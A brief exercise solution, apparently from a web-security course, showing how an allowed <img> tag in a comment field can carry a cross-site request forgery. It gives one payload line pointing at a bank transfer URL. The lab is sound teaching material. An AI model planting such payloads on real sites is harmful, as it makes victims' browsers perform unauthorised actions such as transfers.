# A8 Cross-Site Request Forgery (CSRF)

1.	Since the allowed tags list include `<img>`, the solution is quite simple.
	Tyr to insert the following "comment"

		<img src="http://site.com/bank.php?transferTo=555">

[Go to Ex5](./ex5.md) | [Go to Ex7](./ex7.md)

